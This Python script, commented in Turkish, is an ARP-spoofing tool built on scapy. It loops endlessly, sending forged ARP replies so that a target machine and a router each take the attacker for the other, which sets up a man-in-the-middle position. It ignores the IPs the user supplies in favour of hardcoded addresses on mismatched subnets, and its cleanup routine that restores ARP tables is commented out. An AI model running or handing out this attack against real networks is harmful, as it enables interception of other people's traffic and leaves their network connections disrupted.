from tabnanny import verbose
from time import time
import scapy.all as scapy
import time
import optparse


#Mac Adresini alıyoruz bu fonksiyonla
def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    #scapy.ls(scapy.ARP())
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0] #,verbose=False gereksiz ekran cıktı vermemesini saglar.
    return answered_list[0][1].hwsrc
    #answered_list.summary() 
    
def arp_poisoning(target_ip,poisoned_ip):
    #poisoned ip dedigimiz sey modem veya router ip sidir.
    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)

#fooled_ip kandırılmıs ip 
def reset_operation(fooled_ip,gateway_ip):
    
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response,verbose=False,count=6)
    
def get_user_input():
    parse_object = optparse.OptionParser()

    parse_object.add_option("-t", "--target",dest="target_ip",help="Enter Target IP")
    parse_object.add_option("-g","--gateway",dest="gateway_ip",help="Enter Gateway IP")

    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Enter Target IP")

    if not options.gateway_ip:
        print("Enter Gateway IP")

    return options

number = 0

user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip  
try:
    while True:
        arp_poisoning("192.168.1.101","192.168.218.1") #windows makinesi icin bu
        arp_poisoning("192.168.218.1","192.168.1.101") #modemin bizi windows makinesi olarak algılamasını saglamak icin
        number += 2
        print("\rSending packets " + str(number),end="")
        time.sleep(3)
    
except KeyboardInterrupt:
    print("\nQuit & Reset")
    #reset_operation(user_target_ip,user_gateway_ip)
    #reset_operation(user_gateway_ip,user_target_ip)